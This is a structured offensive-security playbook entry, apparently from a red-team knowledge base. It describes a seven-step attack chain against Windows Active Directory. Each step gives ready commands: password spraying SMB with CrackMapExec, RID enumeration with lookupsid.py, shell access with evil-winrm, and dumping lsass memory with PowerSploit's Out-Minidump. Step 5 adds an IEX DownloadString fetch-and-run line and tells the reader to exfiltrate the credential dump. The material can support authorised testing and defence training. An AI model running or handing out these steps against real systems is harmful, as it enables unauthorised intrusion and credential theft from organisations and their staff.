---
type: attack_chain
description: >-
  This attack chain demonstrates a realistic path from gathering usernames via
  OSINT from public webpages, bruteforcing SMB for initial credentials,
  enumerating additional users via authenticated RID bruteforce, gaining remote
  access via WinRM shell, dumping process memory, and extracting sensitive
  strings like passwords from the dump to enable further lateral movement or
  privilege escalation in a Windows Active Directory environment.
verified: true
submitted: true
step_count: 7
created_at: '2023-02-19T19:09:26.795501+00:00'
updated_at: '2023-05-30T20:16:01.720164+00:00'
procedures:
  - '[[procedures/build-user-list-from-public-webpage]]'
  - '[[procedures/brute-force-smb-usernames-and-passwords]]'
  - '[[procedures/brute-force-smb-users-using-rid-authenticated]]'
  - '[[procedures/spawn-interactive-shell-with-winrm]]'
  - '[[procedures/dump-process-memory-using-powershell]]'
  - '[[procedures/find-interesting-strings-in-raw-memory-dump]]'
  - '[[procedures/spawn-interactive-shell-with-winrm]]'
commands:
  - '[[procedures/build-user-list-from-public-webpage]]'
  - '[[commands/crackingmapexec-brute-force-smb-usernames-and-passwords]]'
  - '[[commands/crackingmapexec-brute-force-smb-users-using-rid]]'
  - '[[commands/lookupsid-py-brute-force-smb-users-using-rid]]'
  - '[[commands/evil-winrm-connect-to-winrm-server]]'
  - '[[commands/get-process-list-running-processes]]'
  - '[[commands/out-minidump-dump-process-memory]]'
  - '[[commands/search-raw-data-for-human-readable-strings]]'
techniques:
  - '[[Account Discovery]]'
  - '[[Windows Remote Management]]'
  - '[[Brute Force]]'
  - '[[Data from Local System]]'
  - '[[Gather Victim Org Information]]'
tactics:
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
  - '[[Credential Access]]'
  - '[[Collection]]'
  - '[[Reconnaissance]]'
tags:
  - windows
  - smb
  - rid
  - winrm
  - shell
  - brute-force
  - ctf
  - memory-dump
platforms:
  - Windows
tools:
  - '[[tools/CrackMapExec]]'
  - '[[tools/Impacket]]'
  - '[[tools/Evil-WinRM]]'
  - '[[tools/PowerSploit]]'
validated: true
---

# OSINT-User-Enumeration-SMB-Bruteforce-RID-Enumeration-to-WinRM-Shell-with-Memory-Dump-Analysis

This multi-stage attack chain targets Windows environments with exposed SMB services, starting from passive reconnaissance to build a username list from public sources, progressing through credential bruteforcing to gain initial access, user enumeration via RID cycling, remote shell execution via WinRM, and finally memory forensics to extract additional credentials for deeper persistence. The scenario assumes an attacker with network access to a target domain-joined Windows machine in an Active Directory setup, aiming for domain admin access or data exfiltration. Difficulty: Advanced; Estimated time: 2-4 hours.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Verified |
| Total Steps | 7 |
| Execution Time | ~2-4 hours |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[OSINT User Gathering] --> B[SMB Brute Force]
    B --> C[RID User Enumeration]
    C --> D[WinRM Initial Shell]
    D --> E[Memory Dump]
    E --> F[String Extraction]
    F --> G[WinRM Escalated Shell]

    style A fill:#3498db
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#9b59b6
    style E fill:#e67e22
    style F fill:#1abc9c
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/CrackMapExec]]
- [[tools/Impacket]]
- [[tools/Evil-WinRM]]
- [[tools/PowerSploit]]

### Target Environment

- Windows Server or Workstation with SMB (port 445) and WinRM (port 5985) enabled
- Active Directory domain with predictable username patterns
- Network connectivity from attacker machine (Linux/Kali recommended)

### Initial Access Requirements

- Attacker machine with tools installed
- Wordlist for passwords (e.g., rockyou.txt)
- No initial credentials required; starts with OSINT

## Detailed Attack Procedures

### Step 1: Gather Usernames from Public Webpage
procedure: [[procedures/build-user-list-from-public-webpage]]

**Objective**: Collect potential usernames by identifying employee names from the target's public website and generating common naming conventions to create a bruteforce wordlist.

**Instructions**: Manually browse the target organization's website (e.g., about us, team pages) to extract full names. Use browser developer tools to inspect page source for additional names in metadata or comments. Generate username variations based on common patterns like first name, last name, first.last, initials, etc. Save the list to a file like users.txt for use in subsequent bruteforcing. This step relies on predictable admin naming schemes in enterprises.

**Expected Output**: A text file (users.txt) containing 50-200 potential usernames, e.g., john.doe, jdoe, JohnDoe.

**Success Indicators**:
- At least 20 unique names extracted from public sources
- Username list covers common patterns without duplicates

### Step 2: Brute Force SMB for Initial Credentials
procedure: [[procedures/brute-force-smb-usernames-and-passwords]]

**Objective**: Use the gathered username list to bruteforce weak passwords against the target's SMB service to obtain valid credentials.

**Instructions**: Prepare a password wordlist (e.g., rockyou.txt). Run CrackMapExec to spray usernames against SMB shares, testing common passwords. Monitor for successful authentications indicated by 'Pwn3d!' output. If a hit, note the valid username:password pair for next steps. This is noisy, so use in environments where stealth is not critical.

Use [[commands/crackingmapexec-brute-force-smb-usernames-and-passwords]]:

```bash
crackmapexec smb $_TARGET_IP -u users.txt -p passwords.txt
```

If successful, export the valid creds for RID enumeration.

**Expected Output**: Output showing successful logins, e.g., '[+] TARGET\username:password (Pwn3d!)'.

**Success Indicators**:
- At least one valid credential pair obtained
- No connection errors to SMB port 445

### Step 3: Enumerate Additional Users via RID Brute Force
procedure: [[procedures/brute-force-smb-users-using-rid-authenticated]]

**Objective**: Leverage the initial credentials to authenticate and bruteforce Relative Identifiers (RIDs) over SMB to discover all domain users, including privileged accounts like Administrator.

**Instructions**: With valid creds from Step 2, use authenticated RID cycling to query the Security Account Manager (SAM) for user SIDs. Start with CrackMapExec for broad enumeration, falling back to Impacket's lookupsid.py if needed. Focus on RIDs 500-1000 for user accounts. Pipe output to a file for tracking discovered users.

Use [[commands/crackingmapexec-brute-force-smb-users-using-rid]]:

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p $_PASSWORD --rid-brute
```

Alternatively, [[commands/lookupsid-py-brute-force-smb-users-using-rid]]:

```bash
lookupsid.py '$_USERNAME:$_PASSWORD'@$_TARGET_IP
```

**Expected Output**: List of users with SIDs, e.g., '500: DOMAIN\Administrator (SidTypeUser)'.

**Success Indicators**:
- 10+ users enumerated, including admin accounts
- Authentication successful with initial creds

### Step 4: Establish Initial WinRM Shell Access
procedure: [[procedures/spawn-interactive-shell-with-winrm]]

**Objective**: Use obtained credentials to spawn a remote PowerShell session via WinRM for command execution on the target.

**Instructions**: Ensure WinRM is enabled on target (common in AD). From attacker machine, connect using evil-winrm with the creds from Step 2 or 3. Once connected, verify access by running basic commands like whoami or systeminfo. This provides a foothold for further actions like memory dumping.

Use [[commands/evil-winrm-connect-to-winrm-server]]:

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```

**Expected Output**: Interactive shell prompt, e.g., '*Evil-WinRM* PS C:\Users\username>'.

**Success Indicators**:
- Shell prompt appears without errors
- Basic commands execute successfully

### Step 5: Dump Target Process Memory
procedure: [[procedures/dump-process-memory-using-powershell]]

**Objective**: From the WinRM shell, dump memory of a sensitive process (e.g., lsass.exe) to extract credentials or keys offline.

**Instructions**: In the WinRM session, first list running processes to identify targets like lsass (PID for credential storage). Download and import PowerSploit's Out-Minidump.ps1 if not present (use IEX (New-Object Net.WebClient).DownloadString('url')). Then pipe Get-Process to Out-Minidump to create .dmp files. Exfiltrate the dump via SMB or HTTP for analysis.

First, [[commands/get-process-list-running-processes]]:

```powershell
Get-Process
```

Then, [[commands/out-minidump-dump-process-memory]]:

```powershell
Get-Process -Name lsass | Out-Minidump -DumpFilePath C:\temp\lsass.dmp
```

Exfiltrate the file to attacker machine.

**Expected Output**: .dmp file created, e.g., 'lsass_1234.dmp' with size in hundreds of MB.

**Success Indicators**:
- Dump file generated without errors
- Process PID matches target

### Step 6: Extract Sensitive Strings from Memory Dump
procedure: [[procedures/find-interesting-strings-in-raw-memory-dump]]

**Objective**: Analyze the dumped memory file offline to pull out human-readable strings like passwords, hashes, or tokens for further exploitation.

**Instructions**: Transfer the .dmp to attacker machine. Use the strings tool to extract printable characters, then grep for keywords like 'password', 'key', or known usernames. Use context flags (-A, -B) to see surrounding data. Look for patterns like base64 or Cisco type 7 hashes if relevant. This often reveals cleartext creds for escalation.

Use [[commands/search-raw-data-for-human-readable-strings]]:

```bash
strings $_DUMP_FILE | grep -i password -A 5 -B 5
```

Review output for actionable info, e.g., additional passwords.

**Expected Output**: Lines with sensitive data, e.g., 'password=secret123' or hashes.

**Success Indicators**:
- Relevant strings extracted (e.g., creds or keys)
- No empty or irrelevant output

### Step 7: Escalate Access with Extracted Credentials via WinRM
procedure: [[procedures/spawn-interactive-shell-with-winrm]]

**Objective**: Use credentials or tokens extracted from memory to spawn a higher-privilege WinRM shell, achieving persistence or lateral movement.

**Instructions**: With new creds from Step 6 (e.g., admin password), reconnect via WinRM to the same or another target. Verify elevated access by checking privileges or accessing restricted shares. This completes the chain by enabling full control.

Use [[commands/evil-winrm-connect-to-winrm-server]] with new creds:

```bash
evil-winrm -i $_TARGET_IP -u $_NEW_USERNAME -p $_NEW_PASSWORD
```

**Expected Output**: Elevated shell prompt with admin context.

**Success Indicators**:
- Access to privileged resources confirmed
- No authentication failures

## Attack Chain Summary

### Key Achievements

- User list built from OSINT for targeted bruteforcing
- Initial SMB credentials obtained via password spraying
- Full user enumeration via RID for account discovery
- Remote shell established via WinRM for execution
- Process memory dumped for credential harvesting
- Sensitive strings extracted for escalation
- Escalated WinRM access using harvested creds

---

*Last updated: 2023-05-30T20:16:01.720164+00:00*
